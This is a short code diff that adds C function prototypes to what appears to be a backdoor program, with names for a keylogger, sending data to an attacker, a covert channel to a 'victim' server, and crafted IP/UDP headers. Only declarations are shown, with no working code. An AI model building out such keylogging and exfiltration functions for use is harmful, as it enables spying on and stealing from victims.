@@ -36,9 +36,13 @@ int launch(char **command_arr, u_char *args);
 void send_to_attacker(u_char *args);
 unsigned short create_udp_header(struct udphdr* uh, uint16_t port);
 unsigned short create_ip_header(struct iphdr* ih, char c, u_char *args);
-
+void initialize_victim_server(struct options_victim *opts);
 void* activate_keylogger(void* arg);
 void* activate_cvc(void* arg);
+void cvc_select_call(struct options_victim *opts, struct sockaddr_in cvc_address);
+void create_victim_cvc_socket(struct options_victim *opts, struct sockaddr_in *cvc_address);
+
+
 void activate_select_multiplexing(void* arg);
 
 
